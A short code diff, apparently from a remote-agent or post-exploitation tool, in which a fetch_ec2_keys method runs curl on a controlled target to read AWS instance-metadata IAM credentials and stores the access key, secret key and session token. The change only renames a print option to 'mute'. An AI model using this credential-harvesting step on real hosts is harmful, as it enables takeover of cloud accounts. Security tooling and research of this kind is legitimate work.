@@ -968,9 +968,9 @@ class Main:
         print('')
 
     def fetch_ec2_keys(self, target, conn):
-        instance_profile = self.server.run_cmd(target, conn, 'curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/', print_res=False)
+        instance_profile = self.server.run_cmd(target, conn, 'curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/', mute=True)
         if not instance_profile == '' and 'not found' not in instance_profile:
-            keys = self.server.run_cmd(target, conn, f'curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/{instance_profile}', print_res=False)
+            keys = self.server.run_cmd(target, conn, f'curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/{instance_profile}', mute=True)
             if '"Code" : "Success",' in keys:
                 keys = json.loads(keys)
                 self.set_keys(f'Agent{target}', keys['AccessKeyId'], keys['SecretAccessKey'], keys['Token'])
